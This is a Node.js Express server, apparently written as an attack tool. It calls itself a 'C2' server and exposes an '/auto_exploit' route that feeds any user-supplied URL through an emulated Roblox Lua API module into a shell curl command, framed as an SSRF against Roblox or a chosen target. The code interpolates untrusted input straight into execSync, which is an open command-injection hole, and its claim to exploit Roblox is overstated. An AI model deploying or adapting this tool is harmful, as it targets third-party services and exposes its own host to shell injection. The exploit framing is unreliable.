// language: JavaScript, target: Node.js (Render)
// @author: Ratman4080

const express = require('express');
const { execSync } = require('child_process');
const { lua, lauxlib, lualib, to_luastring, to_jsstring } = require('fengari');

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================================
// 1. O DUMP DO APIUTIL (Traduzido de Luau para Lua 5.3 para o Fengari)
// ============================================================================
const luaSource = `
local HttpRbxApiService = game:GetService("HttpRbxApiService")
local ContentProvider = game:GetService("ContentProvider")
local t1 = {}

function t1.getBaseDomain()
    local BaseUrl = ContentProvider.BaseUrl
    if string.sub(BaseUrl, #BaseUrl) ~= "/" then 
        BaseUrl = BaseUrl .. "/" 
    end
    local _, v2 = string.find(BaseUrl, "://")
    local _, v3 = string.find(BaseUrl, "%.", v2 + 1)
    return string.sub(BaseUrl, v3 + 1)
end

local function requestAndRetry(p1, p2)
    local v5 = 0
    if p2 ~= nil then v5 = p2 end
    
    local ok, result = pcall(p1)
    if ok then return true, result end
    if v5 >= 2 then return false, result end
    
    local v6 = 2 ^ (v5 - 1)
    wait(v6)
    return requestAndRetry(p1, v5 + 1)
end

function t1.requestAndRetryPost(p3, p4)
    return requestAndRetry(function()
        return HttpRbxApiService:PostAsyncFullUrl(p3, p4)
    end)
end

function t1.requestAndRetryGet(p5)
    return requestAndRetry(function()
        return HttpRbxApiService:GetAsyncFullUrl(p5)
    end)
end

return t1
`;

// ============================================================================
// 2. MOTOR DE EXECUÇÃO (FENGARI + CURL)
// ============================================================================
function runVulnerability(targetUrl) {
    return new Promise((resolve) => {
        const L = lauxlib.luaL_newstate();
        lualib.luaL_openlibs(L);

        // Injetando o game:GetService
        lua.lua_newtable(L);
        lua.lua_pushcfunction(L, (state) => {
            const serviceName = lua.lua_tostring(state, 2); 
            lua.lua_newtable(state);

            if (to_jsstring(serviceName) === 'HttpRbxApiService') {
                // Simulando GetAsyncFullUrl com curl síncrono
                lua.lua_pushcfunction(state, (s) => {
                    const url = to_jsstring(lua.lua_tostring(s, 2)); 
                    let responseStr = "";
                    try {
                        const cmd = `curl -s -L --max-time 8 -H "User-Agent: Roblox/WinInet" "${url}"`;
                        responseStr = execSync(cmd, { encoding: 'utf-8' });
                    } catch (e) {
                        responseStr = `FETCH_ERROR: ${e.message}`;
                    }
                    lua.lua_pushstring(s, to_luastring(responseStr));
                    return 1;
                });
                lua.lua_setfield(state, -2, to_luastring('GetAsyncFullUrl'));
                
                // Mock para PostAsyncFullUrl
                lua.lua_pushcfunction(state, (s) => {
                    lua.lua_pushstring(s, to_luastring("POST_MOCK_OK"));
                    return 1;
                });
                lua.lua_setfield(state, -2, to_luastring('PostAsyncFullUrl'));
            }

            if (to_jsstring(serviceName) === 'ContentProvider') {
                lua.lua_pushstring(state, to_luastring('https://www.roblox.com/'));
                lua.lua_setfield(state, -2, to_luastring('BaseUrl'));
            }
            return 1;
        });
        lua.lua_setfield(L, -2, to_luastring('GetService'));
        lua.lua_setglobal(L, to_luastring('game'));

        // Mock da função wait
        lua.lua_register(L, 'wait', (state) => {
            lua.lua_pushboolean(state, 1);
            return 1;
        });

        // Executa o script Lua
        const loadResult = lauxlib.luaL_loadstring(L, to_luastring(luaSource));
        if (loadResult !== lua.LUA_OK) {
            return resolve({ error: "Erro na compilação do Lua: " + to_jsstring(lua.lua_tostring(L, -1)) });
        }

        lua.lua_pcall(L, 0, 1, 0);

        // Chama o requestAndRetryGet
        lua.lua_getfield(L, -1, to_luastring('requestAndRetryGet'));
        lua.lua_pushstring(L, to_luastring(targetUrl));
        
        const callStatus = lua.lua_pcall(L, 1, 2, 0);
        
        if (callStatus === lua.LUA_OK) {
            const success = lua.lua_toboolean(L, -2);
            const result = lua.lua_tostring(L, -1);
            resolve({
                success: success === 1,
                response: to_jsstring(result).substring(0, 500)
            });
        } else {
            resolve({ error: to_jsstring(lua.lua_tostring(L, -1)) });
        }
    });
}

// ============================================================================
// 3. ROTAS DO SERVIDOR
// ============================================================================

app.get('/', (req, res) => {
    res.send('Servidor C2 Ativo. Use /auto_exploit para disparar a vuln.');
});

// Rota automática que dispara a vulnerabilidade
app.get('/auto_exploit', async (req, res) => {
    // O alvo do SSRF. Por padrão, bate na API do Roblox.
    const targetUrl = req.query.url || 'https://users.roblox.com/v1/users/authenticated';
    
    console.log(`[EXPLOIT] Iniciando automático via Lua para: ${targetUrl}`);
    
    const result = await runVulnerability(targetUrl);
    
    if (result.error) {
        console.log(`[ERRO] ${result.error}`);
        return res.status(500).json({ status: "error", details: result.error });
    }

    console.log(`[SUCCESS] SSRF executado. Sucesso: ${result.success}`);
    res.json({
        status: "success",
        target: targetUrl,
        lua_success: result.success,
        response_snippet: result.response
    });
});

app.listen(PORT, () => {
    console.log(`[SERVER] Rodando na porta ${PORT}`);
    console.log(`[SERVER] Acesse /auto_exploit?url=https://SEU-ALVO.com para atirar.`);
});
